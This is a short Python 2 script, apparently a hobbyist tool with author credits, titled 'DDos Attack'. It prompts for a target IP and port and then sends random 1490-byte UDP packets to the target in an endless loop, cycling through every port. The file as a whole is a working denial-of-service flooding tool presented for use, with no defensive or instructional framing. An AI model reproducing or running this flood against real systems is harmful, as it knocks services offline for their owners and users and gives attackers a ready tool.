import sys
import os
import re
import urllib.request
import time
import socket
import socks
import random
import threading
#Code Tim
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
print "Author   : HelloMyFriend"
print "github   : https://github.com/bossy0"
print "Facebook : https://www.facebook.com/Bossy.078"
print

url = raw_input("URL Target : ")
host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
ip = raw_input("IP Target : ")
port = input("Port : ")

os.system("clear")
os.system("figlet Attac Starting")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
